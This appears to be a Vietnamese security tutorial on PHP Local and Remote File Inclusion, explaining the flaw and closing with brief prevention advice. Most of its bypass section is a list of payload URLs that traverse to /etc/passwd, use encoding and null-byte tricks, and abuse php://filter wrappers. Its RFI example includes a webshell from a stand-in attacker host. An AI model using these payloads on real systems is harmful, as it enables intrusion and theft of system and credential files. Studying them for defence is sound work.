- Tác hại và một số cách bypass
- Local file inclusion (LFI)
- Lỗ hổng Local file inclusion nằm trong quá trình include file cục bộ có sẵn trên server. Lỗ hổng xảy ra khi đầu vào người dùng chứa đường dẫn đến file bắt buộc phải include. Khi đầu vào này không được kiểm tra, tin tặc có thể sử dụng những tên file mặc định và truy cập trái phép đến chúng, tin tặc cũng có thể lợi dụng các thông tin trả về trên để đọc được những tệp tin nhạy cảm trên các thư mục khác nhau bằng cách chèn các ký tự đặc biệt như /,../, -.

- Local file inclusion trong PHP:

- giá trị của file được cung cấp bởi người dùng có thể bị tấn công: https://victim_site/home.php?file=menu
- Giá trị của biến ‘file’ được lấy vào đoạn mã PHP dưới đây: <?php … include($_REQUEST['file'.'.php']); … ?>
- Giờ thì tin tặc sẽ đưa mã độc vào biến file để truy cập trái phép vào file trong cùng chủ mục hoặc sử dụng kí tự duyệt chỉ mục như ../ để di chuyển đến chỉ mục khác. Ví dụ tin tặc lấy được log bằng cách cung cấp đầu vào /apache/logs/error.log hoặc /apache/logs/access.log hay việc đánh cắp dữ liệu liên quan đến tài khoản của người dùng thông qua ../../etc/passwd trên hệ thống Unix.
Remote file inclusion (RFI)
- RFI cho phép tin tặc include và thực thi trên máy chủ mục tiêu một tệp tin được lưu trữ từ xa. Tin tặc có thể sử dụng RFI để chạy một mã độc trên cả máy của người dùng và phía máy chủ. Ảnh hưởng của kiểu tấn công này thay đổi từ đánh cắp tạm thời session token hoặc các dữ liệu của người dùng cho đến việc tải lên các webshell, mã độc nhằm đến xâm hại hoàn toàn hệ thống máy chủ.

- Remote file inclusion trong PHP:

- Ví dụ giá trị của file được cung cấp bởi người dùng có thể bị tấn công: www.victim_site.com/home.php?file=menu
- Giá trị của biến ‘file’ được lấy vào đoạn mã PHP dưới đây: <?php … include($_REQUEST['file'.'.php']); … ?>
- Giờ thì tin tặc sẽ đưa mã độc vào biến file: www.victim_site.com/home.php?test=https://www.attacker_site.com/shell File shell được bao hàm vào trang có sẵn trên máy chủ và thực thi mỗi khi trang home.php được truy cập. Tin tặc sẽ đưa mã độc vào shell và thực hiện hành vi độc hại.
Một số cách bypass:
- Traversal sequences stripped non-recursively:
```
https://victim_site/home.php?file=....//....//....//etc/passwd
https://victim_site/home.php?file=....\/....\/....\/etc/passwd
http://victim_site/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

Null byte (%00):
```
https://victim_site/home.php?file=../../../../etc/passwd%00
```
Encoding:

```
https://victim_site/home.php?file=..%252f..%252f..%252fetc%252fpasswd
https://victim_site/home.php?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
https://victim_site/home.php?file=%252e%252e%252fetc%252fpasswd
https://victim_site/home.php?file=%252e%252e%252fetc%252fpasswd%00
```
Path and dot truncation:

```
https://victim_site/home.php?file=../../../etc/passwd............[ADD MORE]
https://victim_site/home.php?file=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
https://victim_site/home.php?file=../../../etc/passwd/./././././.[ADD MORE] 
https://victim_site/home.php?file=../../../[ADD MORE]../../../../etc/passwd
```

Filter bypass tricks:

```
https://victim_site/home.php?file=....//....//etc/passwd
https://victim_site/home.php?file=..///////..////..//////etc/passwd
https://victim_site/home.php?file=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```
Using wrappers:

```
https://victim_site/home.php?file=php://filter/read=string.rot13/resource=index.php
https://victim_site/home.php?file=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
https://victim_site/home.php?file=php://filter/convert.base64-encode/resource=index.php
https://victim_site/home.php?file=pHp://FilTer/convert.base64-encode/resource=index.php
```

- Cách phòng chống
- Lỗ hổng xảy ra khi việc kiểm tra đầu vào không được chú trọng. Khuyến cáo riêng thì không nên hoặc hạn chế tới mức tối thiểu phải sử dụng các biến từ "User Input" để đưa vào hàm include() hay eval(). Trong trường hợp phải sử dụng. với các thông tin được nhập từ bên ngoài, trước khi đưa vào hàm cần được kiểm tra kỹ lưỡng

- Chỉ chấp nhận kí tự và số cho tên file (A-Z 0-9). Blacklist toàn bộ kí tự đặc biệt không được sử dụng.
- Giới hạn API cho phép việc include file từ một chỉ mục xác định nhằm tránh directory traversal.
- Tấn công File Inclusion có thể nguy hiểm hơn cả SQL Injection do đó thực sự cần thiết phải có những biện pháp khắc phục lỗ hổng này. Kiểm tra dữ liệu đầu vào hợp lý là chìa khóa để giải quyết vấn đề.
